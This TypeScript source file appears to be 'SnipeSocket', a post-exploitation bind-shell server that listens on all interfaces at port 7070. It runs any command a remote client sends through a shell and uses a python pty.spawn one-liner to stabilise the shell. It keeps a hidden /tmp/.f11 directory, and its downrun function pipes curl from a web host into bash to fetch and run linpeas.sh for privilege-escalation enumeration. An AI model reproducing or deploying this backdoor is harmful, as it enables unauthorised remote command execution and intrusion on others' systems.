// Imports
import colors from 'colors/safe';
import { spawn, execSync, spawnSync, ChildProcessWithoutNullStreams } from 'child_process';
import os from 'os';
import fs from 'fs';
import net from 'net';
import tty, { ReadStream, WriteStream } from 'tty';
import stream, { Duplex, Readable, Writable } from 'stream';

const WEB_HOST = 'http://localhost:8000';
const UNIX_SHELLS = ['zsh', 'bash', 'sh'];
const UNIX_DEFAULT = 'bin/sh';
const TMP_DIR = `/tmp/.f11`;
const CMD_PASS = ['ls', 'cat', 'pwd', 'whoami', 'cd', 'curl', 'wget'];

// Constants
let PROMPT = colors.blue('snipe>') + colors.reset(' ');
const NEWLINE = `\r\n`;
const PORT = 7070;
const HOST = '0.0.0.0';
const STABALIZE = `python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")' || script -qc /bin/bash /dev/null`;
// Create net tcp server
const server = net.createServer();
// Define empty array of SnipeSocket[] to track open connections
const sockets: SnipeSocket[] = [];
const timestamp = (): string => new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');

type msgType = 'ok' | 'good' | 'warn' | 'info' | 'debug' | 'error' | 'fatal';

colors.setTheme({
  ok: ['green'],
  good: ['green'],
  warn: ['yellow'],
  info: ['black', 'bgCyan'],
  debug: ['dim', 'cyan', 'italic'],
  error: ['red', 'underline'],
  fatal: ['white', 'bgRed', 'bold']
});

const log = (...args) => console.log( colors.gray(timestamp()), ...args);
const msg = (theme: msgType, body: string, plain?: string) => {
  log(colors[theme](body));
  if (plain) log(plain);
};
const isMac = (): boolean => /darwin/i.test(os.platform());
const isLinux = (): boolean => /linux/i.test(os.platform());
const isWindows = (): boolean => /win/i.test(os.platform());
const isNotWindows = (): boolean => !isWindows();
const findWinShell = (): string => 'cmd.exe'; // LOL F*#K WINDOWS
const findNixShell = (): string => {
  for (let i = 0; i <  UNIX_SHELLS.length; i++) {
    const shell = UNIX_SHELLS[i];
    const check = spawnSync('which', [shell]);

    if (check.status === 0) {
      const found = check.stdout.toString().trim();
      msg('debug', `Using shell: '${shell}' -> ${found}`);
      return found;
    } else {
      msg('warn', `Unable to find shell: '${shell}'`);

      if (i < UNIX_SHELLS.length - 1) {
        msg('debug', `Trying next shell: ${UNIX_DEFAULT[i+1]} ...`);
      }
    }
  }

  // Return default shell "bin/sh"
  return UNIX_DEFAULT;
}

const findShell = (): string => isNotWindows() ? findNixShell() : findWinShell();

class SnipeSocket {
  public sock: net.Socket;
  public cp: ChildProcessWithoutNullStreams;
  public inShell = false;
  public inSpawn = false;

  constructor (socket: net.Socket) {
    this.sock = socket;

    if (!fs.existsSync(TMP_DIR)) fs.mkdirSync(TMP_DIR, { recursive: true });

    const events = ['close', 'connect', 'data', 'drain', 'end', 'error', 'lookup', 'ready', 'timeout'];

    events.forEach((e, i) => {
      this.sock.on(e, (...args) => {
        msg('debug', `[${i}] sock.on(${e}): ${JSON.stringify(args)}`);
      });
    })
  }

  public get sig(): string {
    return `${this.sock.remoteAddress}:${this.sock.remotePort}`
  }

  public command(data: string, cb?: Function): void {
    const args = data.toString().trim().split(' ').map(p => p.trim());
    const cmd = args.shift() as string;
    this.inShell = true;

    const cp = spawn(cmd, args, { shell: true, detached: true });
    this.sock.on('data', cp.stdin.write.bind(cp.stdin));
    cp.stdout.on('data', this.sock.write.bind(this.sock));
    cp.stderr.on('data', this.sock.write.bind(this.sock));

    cp.on('close', (code) => {
      msg('debug', `[downrun] Child process exited with code ${code}`);
      this.inShell = false;

      if (cb) cb(code);
    });
  }

  public downrun(file: string, cb?: Function): void {
    this.inShell = true;
    const url = `${WEB_HOST}/${file}`;
    // const dwn = `${TMP_DIR}/${file}`;

    const cp = spawn('curl', [`-sSL ${url} | bash`], { shell: true, detached: true });
    this.sock.on('data', cp.stdin.write.bind(cp.stdin));
    cp.stdout.on('data', this.sock.write.bind(this.sock));
    cp.stderr.on('data', this.sock.write.bind(this.sock));

    // cp.on('close', (code) => {
    //   msg('debug', `[downrun] Child process exited with code ${code}`);
    //   this.inShell = false;

    //   if (cb) cb(code);
    // });
  }

  public prompt(): void {
    this.sock.write(`${NEWLINE}${PROMPT}`);
  }

  public welcome(isNexe = false): void {
    let banner = 'msgs/welcome.txt';
    let body = 'Welcome to SnipeSocket!';

    try {
      if (isNexe) {
        body = colors.blue(require('nexeres').get(banner));
        body += colors.blue(require('nexeres').get('msgs/derp-60.txt'));
      } else if (fs.existsSync(banner)) {
        body = colors.blue(fs.readFileSync(banner).toString());
      } else {
        body = `[fallback] ${body}`
      }
    } catch (err) {
      msg('warn', `Caught error reading msg text files, falling back`);
      console.log(err);
      this.sock.write('Welcome!');
    }

    this.sock.write(body);

    this.prompt();
  }

  public spawn (cmd: string, args?: string[], stable?: boolean, opts?: any, cb?: (code: number | null) => void) {
    this.inSpawn = true;
    const cp = spawn(cmd, args, opts);
    this.sock.on('data', cp.stdin.write.bind(cp.stdin));
    cp.stdout.on('data', this.sock.write.bind(this.sock));
    cp.stderr.on('data', this.sock.write.bind(this.sock));

    if (stable) cp.stdin.write(`${STABALIZE}${NEWLINE}`);
    // this.sock.pipe(cp.stdin);
    // cp.stdout.pipe(this.sock);
    // cp.stderr.pipe(this.sock);

    // What about no out?? on enter?
    cp.on('close', (code) => {
      msg('debug', `Child process exited with code ${code}`);
      this.inSpawn = false;

      if (cb) cb(code);
    });
  }

  public shell() {
    this.inShell = true;
    this.spawn(findShell(), [], true, { shell: true, detached: true },  (code) => {
      msg('info', `[shell] Child process exited with code ${code}`);
      this.inShell = false;
    });
  }

  public linpeas() {
    this.downrun('linpeas.sh', () => {
      this.prompt();
    });
  }

  public handle(data: Buffer) {
    msg('info', `Handle socket data: ${data}`);

    const cmd = data.toString().trim();

    if (/^shell$/i.test(cmd)) {
      this.shell();
    } else if (/^linpeas(\.sh)?$/i.test(cmd)) {
      this.linpeas();
    } else if (CMD_PASS.includes(cmd)) {
      this.command(cmd, () => this.prompt());
    } else if (!this.inShell) {
      this.sock.write(colors['warn'](`Command not found: '${cmd}'`));
    }

    if (!this.inShell) this.prompt();
  }
}

// Intialize and listen for connections
server.listen(PORT, HOST, () => {
  msg('good', `F11snipe Server Started!`);
  msg('good', `Listening: ${HOST}:${PORT}`);
  msg('good', `SHELL: ${findShell()}`)
});

// Main handler for new connections
server.on('connection', (sock: net.Socket) => {
  const socket = new SnipeSocket(sock);
  sockets.push(socket);

  msg('info', `[${socket.sig}] New Connection`);

  try {
    // socket.welcome();

    // socket.sock.on('data', socket.handle.bind(socket));
    socket.sock.on('data', (data) => {
      msg('info', `Main loop sock.on(data) => ${data}`);
      const args = data.toString().trim().split(' ').map(p => p.trim());
      const cmd = args.shift() as string;

      const cp = spawn(cmd, args, {
        shell: true,
        detached: true,
        stdio: [ 0, 1, 2 ]
      });

      socket.sock.on('data', (data) => {
        msg('debug', `socket.sock.on(data): ${data}`);
        if (cp.stdin?.writable) {
          cp.stdin.write(data);
        } else {
          msg('warn', `CP stdin NOT WRITABLE!`);
        }
      });

      cp.on('disconnect', () => msg('debug', 'CP Disconnected'));
      cp.on('error', (err) => msg('debug', `CP Error: ${err.message}`));
      cp.on('close', (code) => msg('debug', `CP Close: ${code}`));
      cp.on('exit', (code, signal) => msg('debug', `CP Exit: ${code}`));
      cp.on('message', (message, sendHandle) => msg('debug', `CP Message: '${message}' (${sendHandle})`));
      cp.on('spawn', () => msg('debug', `CP Spawn`));
      // cp.stdout.on('data', (data) => {
      //   msg('debug', `cp.stdout.on(data): ${data}`);
      //   socket.sock.write(data);
      // });
      // cp.stderr.on('data', (data) => {
      //   msg('debug', `cp.stderr.on(data): ${data}`);
      //   socket.sock.write(data);
      // });

      cp.on('close', (code) => {
        msg('debug', `Child process exited with code ${code}`);
        // cp.stdin.end();
      });
    });

    socket.sock.on('close', (hadError: boolean) => {
      if (hadError) log(`Socket.on(close) with error!`);
      let idx = sockets.findIndex((sock) => sock.sig === socket.sig);
      if (idx >= 0) {
        sockets.splice(idx, 1);
      }

      msg('info', `[${socket.sig}] Closed Connection`);
    });
  } catch (err: any) {
    msg('fatal', `Caught connection error: ${err.message}`);
  }
});
